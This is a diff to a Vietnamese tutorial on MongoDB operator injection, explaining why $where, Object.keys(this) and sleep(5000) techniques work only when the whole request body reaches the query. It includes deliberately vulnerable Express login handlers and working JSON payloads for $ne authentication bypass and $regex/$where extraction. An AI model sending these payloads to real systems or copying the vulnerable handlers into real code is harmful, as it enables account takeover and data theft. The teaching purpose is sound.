@@ -629,18 +629,79 @@ Nếu môi trường tạo độ lệch thời gian ổn định giữa điều 
 
 #### 4.1.10. Giới hạn của Parameter-scoped operator injection
 
-Các giới hạn dưới đây đều xuất phát từ cùng một nguyên nhân: backend giữ query shape cố định.
+Các giới hạn dưới đây đều xuất phát từ cùng một nguyên nhân: backend giữ query shape cố định và chỉ lấy một số field cụ thể từ request.
 
 ```js
-findOne({
-  username: req.body.username,
-  password: req.body.password,
+app.post("/login", async (req, res) => {
+  const user = await db.collection("users").findOne({
+    username: req.body.username,
+    password: req.body.password,
+  });
+
+  if (!user) {
+    return res.status(401).send("Invalid username or password");
+  }
+
+  req.session.user = user.username;
+  res.redirect("/my-account");
 });
 ```
 
-Attacker chỉ điều khiển value ở bên phải các field như `username` hoặc `password`. Attacker không thêm được key mới ở cấp root của query object.
+Với backend này, attacker chỉ điều khiển value ở bên phải `username` hoặc `password`. Request có thể biến `password` thành object operator:
 
-Vì vậy, các kỹ thuật sau không áp dụng cho Parameter-scoped operator injection thuần túy:
+```json
+{"username":"administrator","password":{"$ne":"invalid"}}
+```
+
+Query thực tế vẫn giữ shape cố định:
+
+```js
+{
+  username: "administrator",
+  password: { $ne: "invalid" },
+}
+```
+
+Vì vậy, bypass hoặc extract field đã biết bằng `$regex` có thể dùng nếu field đó nằm trong query. Nhưng attacker không thêm được key mới ở cấp root. Ví dụ request này có thêm `$where`:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
+```
+
+Trong backend ở trên, `req.body.$where` không được đưa vào query vì code chỉ đọc `req.body.username` và `req.body.password`. Query thực tế vẫn là:
+
+```js
+{
+  username: "administrator",
+  password: { $ne: "invalid" },
+}
+```
+
+Nếu cố nhét `$where` vào bên trong một field:
+
+```json
+{"username":"administrator","password":{"$where":"sleep(5000)"}}
+```
+
+thì `$where` lại nằm trong value của `password`, không nằm ở root của query object. Đây không phải JavaScript context để chạy `sleep(5000)` hoặc đọc `this`.
+
+Điều này cũng giải thích vì sao không dùng được `Object.keys(this)` trong Parameter-scoped operator injection thuần túy. Payload sau chỉ là một regex trên field `password`, không phải JavaScript expression trên document:
+
+```json
+{"username":"administrator","password":{"$regex":"Object.keys(this)[1].match(/^p/)"}}
+```
+
+Database không evaluate chuỗi trong `$regex` như JavaScript; nó chỉ dùng chuỗi đó làm regular expression cho value của `password`.
+
+Tương tự, không thể extract field ẩn nếu backend không map field đó vào query. Ví dụ request có thêm `resetToken`:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"resetToken":{"$regex":"^a"}}
+```
+
+nhưng backend không đọc `req.body.resetToken`, nên query thực tế không chứa điều kiện trên `resetToken`.
+
+Tóm lại, các kỹ thuật sau không áp dụng cho Parameter-scoped operator injection thuần túy:
 
 - Không thêm được top-level `$where`, vì `$where` phải nằm cùng cấp với `username` và `password`, không nằm bên trong value của một field.
 - Không dùng được `Object.keys(this)` hoặc `this[Object.keys(this)[n]]`, vì các expression này cần JavaScript context do `$where` cung cấp.
@@ -829,11 +890,66 @@ Nếu request chỉ chậm khi ký tự đang thử đúng, có thể lặp lạ
 
 #### 4.2.11. Giới hạn của Top-level query operator injection
 
-Top-level query operator injection không bị giới hạn bởi query shape cố định như Parameter-scoped operator injection, nhưng các kỹ thuật JavaScript vẫn phụ thuộc vào việc `$where` được evaluate.
+Top-level query operator injection có quyền điều khiển rộng hơn vì backend đưa nguyên request body vào query:
 
-Các mục dùng `Object.keys(this)`, `this[Object.keys(this)[n]]`, hoặc `sleep(5000)` chỉ áp dụng sau khi đã xác nhận `$where` hoạt động như ở bước detect. Nếu chỉ điều khiển được field operator như `$ne`, `$in`, hoặc `$regex`, nhưng không có JavaScript context, thì không dùng được JavaScript introspection và không tạo được delay chủ động bằng `sleep(5000)`.
+```js
+app.post("/login", async (req, res) => {
+  const user = await db.collection("users").findOne(req.body);
 
-Việc extract field name hoặc field value vẫn cần response oracle hoặc timing oracle. Nếu điều kiện đúng/sai không tạo khác biệt quan sát được, kỹ thuật extract không có tín hiệu để phân biệt kết quả.
+  if (!user) {
+    return res.status(401).send("Invalid username or password");
+  }
+
+  req.session.user = user.username;
+  res.redirect("/my-account");
+});
+```
+
+Với backend này, request có thể thêm `$where` ở root:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match(/^p/)"}
+```
+
+Query thực tế giữ nguyên `$where`, nên các kỹ thuật `Object.keys(this)`, `this[Object.keys(this)[n]]`, hoặc `sleep(5000)` có chỗ để chạy nếu `$where` được evaluate.
+
+Giới hạn nằm ở chỗ Top-level query operator injection không tự động đồng nghĩa với JavaScript execution. Nếu payload chỉ dùng field operator, chẳng hạn:
+
+```json
+{"username":"administrator","password":{"$regex":"^p"}}
+```
+
+thì backend vẫn xử lý operator ở field `password`, nhưng chưa có JavaScript context. Chuỗi như `Object.keys(this)` không chạy nếu bị đặt vào `$regex`:
+
+```json
+{"username":"administrator","password":{"$regex":"Object.keys(this)[1].match(/^p/)"}}
+```
+
+Ở đây `Object.keys(this)[1].match(/^p/)` chỉ là pattern regex, không phải expression được evaluate trên document.
+
+Một biến thể khác là backend nhận nguyên object nhưng lọc bỏ `$where` trước khi query:
+
+```js
+app.post("/login", async (req, res) => {
+  const { $where, ...query } = req.body;
+  const user = await db.collection("users").findOne(query);
+
+  res.status(user ? 200 : 401).send("Done");
+});
+```
+
+Với code này, các field operator như `$ne` hoặc `$regex` vẫn có thể còn tác dụng nếu nằm trong `query`, nhưng `$where` không đi tới database. Vì vậy JavaScript introspection và delay chủ động bằng `sleep(5000)` không dùng được.
+
+Giới hạn cuối cùng là oracle. Backend có thể evaluate query nhưng trả response giống nhau cho cả điều kiện đúng và sai:
+
+```js
+app.post("/login", async (req, res) => {
+  await db.collection("users").findOne(req.body);
+  res.status(200).json({ message: "OK" });
+});
+```
+
+Trong code này, response body và status code không cho biết `$where` đúng hay sai. Extract field name hoặc field value chỉ còn khả thi nếu có timing oracle ổn định, ví dụ payload `$where` tạo delay có điều kiện và thời gian phản hồi đủ khác biệt so với baseline.
 
 ## 5. Case study
 
